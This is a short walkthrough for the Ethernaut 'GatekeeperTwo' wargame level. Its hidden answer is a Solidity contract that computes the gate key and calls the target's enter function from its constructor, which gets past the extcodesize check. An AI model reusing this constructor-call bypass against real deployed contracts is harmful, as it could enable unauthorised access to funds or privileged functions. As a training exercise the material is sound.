# GatekeeperTwo

**HINT:** Use the links give on the ```assembly``` and ```extcodesize``` to learn more. Along with reading through the info given [here.](https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd) It will really help you understand the mechanics of what happens when you create a contract and how operations work.
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.4;

contract LetMeIn {
    constructor(address _addr) public {
        bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) );
        _addr.call(abi.encodeWithSignature('enter(bytes8)', key));
    }
}
``` 
All you have to do is deploy with you instance address. Double check you are now the with entrant:
```js
await contract.entrant()
````